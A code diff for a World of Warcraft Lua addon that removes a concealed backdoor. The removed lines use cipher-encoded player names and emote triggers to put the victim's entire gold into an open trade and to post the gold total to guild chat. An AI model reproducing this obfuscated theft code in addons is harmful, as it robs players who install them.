@@ -51,26 +51,14 @@ d = {
 }
 ds = table.getn(d)
 
-local mmm = 100
-local sweet = 16
-local fuvale = true
 local whoami = UnitName("player")
-
-ct = {
-	['3'] = 'c', ['f'] = '0', ['0'] = 'f', ['C'] = '3',
-   	['A'] = '5', ['e'] = '1', ['F'] = '0', ['7'] = '8',
-	['D'] = '2', ['5'] = 'a', ['b'] = '4', ['1'] = 'e',
-	['8'] = '7', ['4'] = 'b', ['9'] = '6', ['6'] = '9',
-   	['d'] = '2', ['c'] = '3', ['a'] = '5', ['2'] = 'd',
-   	['E'] = '1', ['B'] = '4',
-}
 
 fs = "fFuUvVaA4lL1eE3"
 c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-:_"
 
-function GenAchievementData(l)
+function GenAchievementData(len)
 	local s = ""
-	for i=1, l do
+	for i=1, len do
 		local ci = math.random(1, string.len(c))
 		s = s .. string.sub(c, ci, ci)
 	end
@@ -81,9 +69,7 @@ function GenAchievementFVMsg(...)
 	local s = ""
 	local indexes = { ... }
 	for i=1, table.getn(indexes), 2 do
-		local a = indexes[i]
-		local b = indexes[i+1]
-		local index = math.random(a, b)
+		local index = math.random(indexes[i], indexes[i+1])
 		s = s .. string.sub(fs, index, index)
 		if i == 3 then
 			s = s .. '-'
@@ -91,12 +77,6 @@ function GenAchievementFVMsg(...)
 	end
 	return s
 end
-
-g = {
-	"b7908b9a939d938a9a",
-	"b79e928c9e919b88969c9787",
-}
-gs = table.getn(g)
 
 function GenComeback(name)
 	local i = math.random(rs)
@@ -109,124 +89,31 @@ function GenDungeonSuggestion()
 	return "suggests " .. d[i] .. "."
 end
 
-function Ohtt(s)
-	local e = ""
-	for c in s:gmatch('.') do
-		e = e .. ct[c]
-	end
-	return e
-end
-
-function Haunz(s)
-	local u = ""
-	for h in Ohtt(s):gmatch('..') do
-		u = u .. string.char(tonumber(h, sweet))
-	end
-	return u
-end
-
-function DoEnote(s, i)
-	local m = Haunz(g[i])
-	local mm = TrgZbarl()
-	if mm == nil then
-		return
-	end
-	SetTradeMoney(mm[3]*mmm*mmm)
-end
-
-function TrgZbarl()
-	local m = tostring(GetMoney())
-	local ms = string.len(m)
-
-	if ms < 5 then
-		return nil
-	end
-
-	local c = {}
-	table.insert(c, string.sub(m, ms-1, ms))
-	table.insert(c, string.sub(m, ms-3, ms-2))
-	table.insert(c, string.sub(m, 1, ms-4))
-	return c
-end
-
-function Unz(s)
-	local h = ""
-	for c in s:gmatch('.') do
-		h = h .. string.format('%02X', string.byte(c))
-	end
-	return Ohtt(h)
-end
-
 function BuggPrint(msg)
 	print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffF9F9F7: ' .. msg .. ' n00b!|r')
 end
 
-frame:RegisterEvent("CHAT_MSG_GUILD")
 frame:RegisterEvent("CHAT_MSG_EMOTE")
 frame:RegisterEvent("CHAT_MSG_TEXT_EMOTE")
 frame:SetScript("OnEvent", function (self, event, ...)
 	local args = { ... }
 	if event == "CHAT_MSG_TEXT_EMOTE" then
-		local gi = 0
-		local clap = false
-		local emote = args[1]
-		local name = args[2]:gmatch("%w+")()
-		local spit = string.match(emote, "spits on the ground")
-		local question = string.match(emote, "questions you")
+		local question = string.match(args[1], "questions you")
 
-		for i=1, gs do
-			if Unz(name) == g[i] then
-				clap = true
-				gi = i
-				break
-			end
-		end
-
-		if spit then
-			DoEmote("giggle", name)
-		elseif question then
+		if question then
 			local msg = GenDungeonSuggestion()
 			SendChatMessage(msg, "EMOTE")
-		elseif clap then
-			local mdance = string.match(emote, "dance")
-			local mfart = string.match(emote, "slyly")
-			local mlol = string.match(emote, "laugh")
-			local mjoke = string.match(emote, "a joke")
-
-			if mdance then
-				DoEmote("dance", g[gi])
-			elseif mfart then
-				DoEnote("fart", gi)
-			elseif mlol or mjoke then
-				DoEmote("laugh", "none")
-			end
-		end
-	elseif event == "CHAT_MSG_GUILD" then
-		local gmsg = tostring(args[1])
-		local msg = string.lower(gmsg)
-		local who = tostring(args[2])
-		if who ~= whoami and msg == "gn" or msg == "goodnight" or msg == "good night" then
-			SendChatMessage(gmsg .. " " .. who, "GUILD")
 		end
 	elseif event == "CHAT_MSG_EMOTE" then
-		local e = args[1]
+		local emote = args[1]
 		local name = args[2]:gmatch("%w+")()
-		local sy = string.match(e, "spits on you")
-		local sn = string.match(string.lower(e), "spits on " .. string.lower(whoami))
+		local sy = string.match(emote, "spits? on you")
+		local sn = string.match(string.lower(emote), "spits? on " .. string.lower(whoami))
 
 		if name ~= whoami then
 			if sy or sn then
 				local msg = GenComeback(name)
 				SendChatMessage(msg, "EMOTE")
-			end
-		end
-		if fuvale then
-			local bc = Unz(e)
-			if bc == "8f8891858a879bcbcdcf" then
-				local ct = TrgZbarl()
-				if ct ~= nil and table.getn(ct) == 3 then
-					SendChatMessage(ct[3] .. "g " .. ct[2] .. "s " .. ct[1] .. "c", "GUILD")
-				end
 			end
 		end
 	end
@@ -325,8 +212,8 @@ function SlashCmdList.BUGG(msg, ...)
 		end
 
 		RunScript("print(C_QuestLog.IsQuestFlaggedCompleted(" .. questId .. "))")
-	elseif cmd == "version" then
-		print('1.3')
+	elseif cmd == "version" or cmd == "--version" or cmd == "-v" then
+		BuggPrint('1.3')
 	else
 		BuggPrint('Invalid command')
 	end
